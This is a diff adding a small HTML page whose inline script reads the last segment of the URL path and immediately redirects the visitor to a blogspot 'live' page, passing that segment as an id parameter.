@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    // Get the last part of the current URL path
+    const path = window.location.pathname;
+    const slug = path.substring(path.lastIndexOf('/') + 1);
+
+    // Build the redirect URL dynamically
+    const redirectUrl = `https://game24x001.blogspot.com/p/live.html?id=${slug}`;
+
+    // Redirect immediately
+    window.location.href = redirectUrl;
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
